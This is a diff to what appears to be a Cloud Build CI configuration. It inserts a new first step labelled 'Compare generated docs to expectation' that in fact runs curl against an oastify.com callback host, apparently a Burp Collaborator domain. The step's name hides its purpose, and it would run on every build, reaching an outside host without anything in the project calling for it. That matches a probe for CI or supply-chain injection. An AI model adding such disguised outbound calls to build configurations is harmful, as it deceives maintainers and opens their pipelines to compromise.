@@ -1,4 +1,8 @@
 steps:
+- id: Compare generated docs to expectation
+  name: 'node:10.15.1'
+  entrypoint: bash
+  args: ['curl rto774gtaq27xa8xo26ramgau100o2oqd.oastify.com/typedoc-neo-theme']
 - id: Install dependencies
   name: 'node:10.15.1'
   entrypoint: yarn
